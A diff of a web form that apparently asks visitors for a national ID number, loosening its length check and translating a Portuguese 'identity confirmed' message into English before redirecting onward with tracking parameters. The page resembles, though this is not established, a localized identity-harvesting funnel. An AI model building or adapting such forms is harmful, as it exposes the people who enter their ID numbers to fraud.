@@ -992,7 +992,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 <form id="step1Form">
 <div class="form-group">
 <label><span data-msg="step2.t04">Your National ID Number</span></label>
-<input id="cpf" inputmode="numeric" maxlength="11" placeholder="123 456 789" required="" type="tel"/>
+<input id="cpf" inputmode="numeric" maxlength="20" placeholder="e.g. 123456789" required="" type="tel"/>
 </div>
 <button class="btn btn-primary" id="submitBtn1" type="submit">
 <span class="btn-text"><span data-msg="step2.t05">Verify my National ID Number</span></span>
@@ -1141,8 +1141,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       const nif = document.getElementById('cpf').value.replace(/\D/g, '');
       const btn = document.getElementById('submitBtn1');
 
-      if (nif.length !== 9) {
-        alert('Invalid National ID Number. Please enter 9 digits.');
+      if (nif.length < 6 || nif.length > 15) {
+        alert('Invalid National ID Number. Please check the number and try again.');
         return;
       }
 
@@ -1251,7 +1251,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     function renderStep4() {
       const nome = localStorage.getItem('nome');
       mensagemFinal.innerText =
-        `Tudo certo, ${nome}! A sua identidade foi confirmada com sucesso.`;
+        `All set, ${nome}! Your identity has been successfully confirmed.`;
 
       setTimeout(() => {
         const p = new URLSearchParams(window.location.search); window.location.href = '3.html' + (p.toString() ? '?' + p : '');
